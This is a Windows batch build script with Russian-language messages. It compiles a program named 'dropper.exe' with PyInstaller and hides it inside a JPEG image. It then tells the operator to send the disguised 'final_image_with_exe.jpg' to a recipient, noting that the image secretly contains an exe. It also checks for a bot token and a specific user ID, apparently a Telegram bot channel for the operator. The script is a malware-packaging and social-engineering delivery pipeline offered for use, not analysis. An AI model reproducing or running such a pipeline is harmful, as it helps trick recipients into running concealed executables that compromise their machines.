@echo off
echo ========================================
echo Сборка dropper.exe для отправки
echo ========================================
echo.

REM Проверка наличия config.json
if not exist "config.json" (
    echo [ВНИМАНИЕ] Файл config.json не найден!
    echo Скопируйте config.json.example в config.json и добавьте токен бота.
    echo.
    pause
)

REM Проверка наличия embedded_image.jpg
if not exist "embedded_image.jpg" (
    echo [ОШИБКА] Файл embedded_image.jpg не найден!
    pause
    exit /b 1
)

echo Установка зависимостей...
pip install -r requirements.txt

echo.
echo Сборка исполняемого файла...
pyinstaller dropper.spec

if exist "dist\dropper.exe" (
    echo.
    echo ========================================
    echo [УСПЕХ] Exe файл собран!
    echo ========================================
    echo.
    echo Теперь встраиваем exe в изображение...
    echo.
    
    REM Встраиваем exe в изображение
    python prepare_final_image.py
    
    if exist "final_image_with_exe.jpg" (
        echo.
        echo ========================================
        echo [УСПЕХ] Финальный файл готов!
        echo ========================================
        echo.
        echo Готовый файл для отправки: final_image_with_exe.jpg
        echo.
        echo Убедитесь, что:
        echo 1. Токен бота настроен в config.json
        echo 2. Пользователь с ID 8350084460 начал диалог с ботом
        echo.
        echo ВАЖНО: Отправьте получателю файл final_image_with_exe.jpg
        echo Это изображение, но внутри него скрыт exe файл!
        echo.
    ) else (
        echo.
        echo [ПРЕДУПРЕЖДЕНИЕ] Не удалось создать финальное изображение
        echo Используйте: python prepare_final_image.py
        echo.
    )
) else (
    echo.
    echo [ОШИБКА] Сборка не удалась!
    echo.
)

pause
